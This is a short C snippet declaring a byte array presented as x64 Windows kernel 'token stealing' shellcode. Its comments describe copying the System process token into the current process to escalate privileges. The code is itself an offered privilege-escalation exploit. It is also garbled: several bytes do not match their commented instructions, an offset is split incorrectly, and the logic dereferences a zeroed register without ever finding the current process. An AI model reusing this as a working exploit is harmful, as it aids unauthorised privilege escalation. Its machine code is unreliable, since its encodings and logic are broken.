// Token Stealing Shellcode (x64)
// Goal: Find current process EPROCESS, find System process EPROCESS, replace Token.
unsigned char token_steal_shellcode[] = {
    0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00, // mov rax, [rel PsInitialSystemProcess]
    0x48, 0x8B, 0x80, 0x4B, 0x8, 0x0, 0x0,    // mov rax, [rax + 0x4B8] (Token offset)
    0x48, 0x31, 0xC9,                         // xor rcx, rcx
    0x48, 0x8B, 0x53, 0x4B, 0x8, 0x0, 0x0,    // mov rdx, [rcx + 0x4B8]
    0x48, 0x89, 0x48, 0x0, 0x0, 0x0,          // mov [rax], rdx
    0xC3                                     // ret
};
